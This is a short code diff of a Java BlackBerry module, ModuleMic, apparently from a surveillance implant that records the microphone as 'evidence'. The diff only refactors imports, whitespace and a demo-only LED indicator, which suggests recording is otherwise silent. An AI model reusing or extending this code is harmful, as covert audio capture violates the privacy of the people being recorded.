@@ -14,6 +14,7 @@ import net.rim.blackberry.api.phone.PhoneListener;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.Status;
 import blackberry.config.ConfModule;
+import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
@@ -21,7 +22,6 @@ import blackberry.evidence.EvidenceType;
 import blackberry.fs.Path;
 import blackberry.manager.ModuleManager;
 import blackberry.record.AudioRecorder;
-import blackberry.debug.Check;
 import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
 
@@ -55,7 +55,7 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
     public static String getStaticType() {
         return "mic";
     }
-    
+
     public static ModuleMic getInstance() {
         return (ModuleMic) ModuleManager.getInstance().get(getStaticType());
     }
@@ -151,9 +151,9 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
         debug.trace("Started: " + (recorder != null));
         //#endif
 
-        //#ifdef DEMO
-        Debug.ledStart(Debug.COLOR_BLUE_LIGHT);
-        //#endif
+        if (Status.self().isDemo()) {
+            Debug.ledStart(Debug.COLOR_BLUE_LIGHT);
+        }
 
         numFailures = 0;
     }
@@ -175,9 +175,9 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
         //#endif
 
         recorder.stop();
-        //#ifdef DEMO
-        Debug.ledStop();
-        //#endif
+        if (Status.self().isDemo()) {
+            Debug.ledStop();
+        }
     }
 
     /*
